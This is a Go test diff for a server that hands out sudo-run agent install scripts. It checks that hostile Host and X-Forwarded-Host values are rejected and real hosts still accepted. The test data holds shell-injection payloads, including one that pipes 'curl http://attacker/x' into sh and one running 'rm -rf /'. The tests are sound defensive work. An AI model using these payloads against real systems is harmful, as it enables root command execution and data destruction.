@@ -107,3 +107,71 @@ func TestValidateSentinelURL(t *testing.T) {
 		}
 	}
 }
+
+// A Host header is client-supplied and reaches the agent install scripts,
+// which are run with sudo. A host that is not a host must be discarded, not
+// interpolated: a quote and a semicolon would close the shell assignment and
+// append commands to a script somebody then executes as root.
+func TestRequestBaseURLRejectsHostileHosts(t *testing.T) {
+	gin.SetMode(gin.TestMode)
+
+	hostile := []string{
+		`evil.example"; curl http://attacker/x | sh; echo "`,
+		`evil.example"; id; echo "`,
+		"evil.example$(id)",
+		"evil.example`id`",
+		"evil.example\nX-Injected: 1",
+		"evil.example with spaces",
+		"evil.example';rm -rf /;'",
+		"evil.example|sh",
+		"evil.example&&id",
+	}
+	for _, host := range hostile {
+		t.Run(host[:min(len(host), 24)], func(t *testing.T) {
+			for _, viaHeader := range []bool{false, true} {
+				req := httptest.NewRequest(http.MethodGet, "/scripts/server-agent.sh", nil)
+				if viaHeader {
+					req.Host = "sentinel.example"
+					req.Header.Set("X-Forwarded-Host", host)
+				} else {
+					req.Host = host
+				}
+				c, _ := gin.CreateTestContext(httptest.NewRecorder())
+				c.Request = req
+
+				if got := requestBaseURL(c); got != "" {
+					t.Errorf("header=%v produced %q; a hostile host must be discarded", viaHeader, got)
+				}
+			}
+		})
+	}
+}
+
+// The legitimate forms still work, or the fix would break auto-detection.
+func TestRequestBaseURLAcceptsRealHosts(t *testing.T) {
+	gin.SetMode(gin.TestMode)
+
+	ok := map[string]string{
+		"10.1.20.10:3001":        "http://10.1.20.10:3001",
+		"sentinel.example.com":   "http://sentinel.example.com",
+		"sentinel.company.local": "http://sentinel.company.local",
+		"localhost:3000":         "http://localhost:3000",
+		"[2606:4700::1111]:3001": "http://[2606:4700::1111]:3001",
+	}
+	for host, want := range ok {
+		req := httptest.NewRequest(http.MethodGet, "/scripts/server-agent.sh", nil)
+		req.Host = host
+		c, _ := gin.CreateTestContext(httptest.NewRecorder())
+		c.Request = req
+		if got := requestBaseURL(c); got != want {
+			t.Errorf("host %q gave %q, want %q", host, got, want)
+		}
+	}
+}
+
+func min(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
+}
